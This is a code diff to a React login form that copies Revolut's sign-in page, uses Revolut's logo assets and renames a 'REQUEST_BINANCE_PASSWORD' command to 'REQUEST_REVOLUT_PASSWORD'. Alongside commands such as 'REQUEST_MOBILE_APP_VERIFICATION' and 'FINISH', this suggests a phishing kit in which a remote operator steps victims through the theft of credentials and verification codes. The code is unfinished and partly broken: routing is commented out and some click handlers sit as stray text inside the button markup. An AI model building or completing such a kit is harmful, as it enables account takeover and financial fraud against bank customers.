@@ -18,16 +18,30 @@ export default function LoginForm() {
     // Handle command changes
     useEffect(() => {
         if (command === 'REQUEST_EMAIL_AGAIN') {
-            setInvalid(true); // Show error state for email input
-            setIsLoading(false);
-        } else if (command === 'REQUEST_BINANCE_PASSWORD') {
-            setIsLoading(false);
+            console.log("HERE WE WILL PUSH TO PASSWORD PAGE")
+            // setInvalid(true); // Show error state for email input
+            // setIsLoading(false);
+        } else if (command === 'REQUEST_REVOLUT_PASSWORD') {
+            // setIsLoading(false);
             setTimeout(() => {
                 // setIsLoading(false);
-                router.push('/PasswordPage');
+                console.log("HERE WE WILL PUSH TO PASSWORD PAGE")
+                // router.push('/PasswordPage');
             }, 500);
+        } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
+            // setIsLoading(false);
+            setTimeout(() => {
+                // setIsLoading(false);
+                console.log("HERE WE WILL PUSH TO PASSWORD PAGE")
+                // router.push('/PasswordPage');
+            }, 500);
+        }  else if (command === 'FINISH') {
+            setTimeout(() => {
+                resetCommand(); 
+                router.push('/verificationPage');
+            }, 1500);
         }
-    }, [command]);
+    }, [command, router]);
 
     const { validateEmail } = useValidateEmail();
     // Handle email validation
@@ -112,6 +126,22 @@ export default function LoginForm() {
     // Change the form state from phone number to Email
     const changeForm = (form) => {
         setForm(form);
+    };
+
+    const handleAuthButtonClick = (method) => {
+        // Add a debugger statement to check if the function is being called
+        console.log(`ROUTER NEEDS TO PUSH TO ${method.toUpperCase()}`);
+        // Here you would add actual routing logic
+        if (method === 'email') {
+            console.log("Going to email")
+            // router.push('/EmailLoginPage');
+        } else if (method === 'google') {
+            console.log("Going to google")
+            // router.push('/GoogleAuthPage');
+        } else if (method === 'apple') {
+            console.log("Going to apple")
+            // router.push('/AppleLoginPage');
+        }
     };
 
 
@@ -238,6 +268,11 @@ export default function LoginForm() {
                                 <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
                                     <button className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'>
                                         <img src="https://assets.revolut.com/assets/icons/LogoGoogle.svg" alt="" />
+                                        onClick={(e) => {
+                                            e.preventDefault();
+                                            e.stopPropagation();
+                                            handleAuthButtonClick('google');
+                                        }}
                                     </button>
                                     <div className='text-[#191c1f] text-[0.875rem] tracking-[-0.00714em] text-center'>
                                         Google
@@ -248,6 +283,11 @@ export default function LoginForm() {
                                 <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
                                     <button className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'>
                                         <img src="https://assets.revolut.com/assets/icons/LogoIOs.svg" alt="" />
+                                        onClick={(e) => {
+                                            e.preventDefault();
+                                            e.stopPropagation();
+                                            handleAuthButtonClick('Apple');
+                                        }}
                                     </button>
                                     <div className='text-[#191c1f] text-[0.875rem] tracking-[-0.00714em] text-center'>
                                         Apple
